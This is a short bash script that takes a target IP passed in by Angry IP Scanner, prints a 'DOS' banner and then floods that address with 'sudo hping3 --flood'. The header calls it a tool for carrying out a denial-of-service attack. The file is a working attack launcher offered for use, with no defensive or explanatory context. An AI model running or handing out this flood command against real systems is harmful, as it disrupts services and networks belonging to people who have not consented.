#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 0_ALL - HPING3 [DOS]       | THIS_FILE ${fetcher.ip}       | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : SCRIPTS/E_3.sh
# | Description       : Script for carring out DOS attack
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/
# | Author            : Jordon Archer
# | Date              : Feb 5 2024
# ------------------------------------------------------------------------------

# Load Variables

fetcher_ip=$1  # Get the IP from the first argument
# comment=$2

# Load colours
source ~/CYBER_TOOLS/OPENER_SCRIPTS/SUB_SCRIPTS/COLOURS.sh
# source ~/CYBER_TOOLS/OPENER_SCRIPTS/SUB_SCRIPTS/FOLDER.sh

# Display Header

# Tool name https://manytools.org/hacker-tools/ascii-banner/ font ANSI SHADDOW
echo -e "${HEADER1}"  # Set colour to green and make it bold

echo "██████╗  ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║   ██║███████╗
██║  ██║██║   ██║╚════██║
██████╔╝╚██████╔╝███████║
╚═════╝  ╚═════╝ ╚══════╝
                         "

echo -e "${NC}"  # Reset colour and bold

#description
echo -e "${HEADER2}Description${NC}"
echo -e "A Dos attack using hping3.\n"
echo -e "${NC}---------------------------------------------------------------------\n"

# -----------------------------------------------------------------------------------------------------

sudo hping3 --flood -V $fetcher_ip

exit